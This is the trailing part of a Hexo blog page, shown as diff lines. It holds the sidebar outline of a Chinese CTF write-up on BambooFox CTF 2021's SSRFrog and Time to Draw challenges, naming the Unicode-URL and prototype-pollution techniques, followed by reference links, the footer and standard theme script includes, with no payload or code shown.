class="nav-text">根据题目提示和源码我们的目标是利用ssrf访问上面提供的地址拿到flag。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#源码分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#解决"><span class="nav-number">1.2.2.</span> <span class="nav-text">解决</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#由于nodejs中的http模块是用new-URL来处理的，因此我们可以用Unicode编码来绕过。"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">由于nodejs中的http模块是用new URL来处理的，因此我们可以用Unicode编码来绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#示例如下："><span class="nav-number">1.2.2.2.</span> <span class="nav-text">示例如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#temp中的对象全部是数组，其中每个key对应的数组表示该key对应的字符可以用数组中的字符来代替，结果如下："><span class="nav-number">1.2.2.3.</span> <span class="nav-text">temp中的对象全部是数组，其中每个key对应的数组表示该key对应的字符可以用数组中的字符来代替，结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的paylaod："><span class="nav-number">1.2.2.4.</span> <span class="nav-text">最后的paylaod：</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-Time-to-Draw"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 Time to Draw</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-题目源码："><span class="nav-number">1.3.1.</span> <span class="nav-text">1.题目源码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-原型链污染回顾："><span class="nav-number">1.3.2.</span> <span class="nav-text">2.原型链污染回顾：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-分析代码："><span class="nav-number">1.3.3.</span> <span class="nav-text">3.分析代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#原型链污染首先关注没有初始化，可控的字段，然后在后面引用过："><span class="nav-number">1.3.3.1.</span> <span class="nav-text">原型链污染首先关注没有初始化，可控的字段，然后在后面引用过：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#userData-token在if语句中初始化，但是如果跳过if语句，那么该参数就是没有初始化，而且在后面直接使用。"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">userData.token在if语句中初始化，但是如果跳过if语句，那么该参数就是没有初始化，而且在后面直接使用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来需要找到可以进行原型链污染的地方："><span class="nav-number">1.3.3.3.</span> <span class="nav-text">接下来需要找到可以进行原型链污染的地方：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#很明显该处跟我们的示例一样，例如："><span class="nav-number">1.3.3.4.</span> <span class="nav-text">很明显该处跟我们的示例一样，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的payload：-1"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">最后的payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第一步污染原型链"><span class="nav-number">1.3.3.6.</span> <span class="nav-text">第一步污染原型链</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第二步获取flag"><span class="nav-number">1.3.3.7.</span> <span class="nav-text">第二步获取flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0n参考链接"><span class="nav-number">1.4.</span> <span class="nav-text">0x0n参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-spotless-tech-bambooctf-2021-angryface-php-html"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">https://spotless.tech/bambooctf-2021-angryface-php.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-maxdamage-dev-posts-bctf-ssrfrog-html"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">https://maxdamage.dev/posts/bctf-ssrfrog.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-sambrow-ctf-writeups-2021-tree-master-bamboo-fox-ssrfrog"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-eine-tistory-com-entry-BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">https://eine.tistory.com/entry/BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-scavengersecurity-com-bamboofox-ctf-2021-time-to-draw-web"><span class="nav-number">1.4.0.5.</span> <span class="nav-text">https://scavengersecurity.com/bamboofox-ctf-2021-time-to-draw-web/</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">195.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
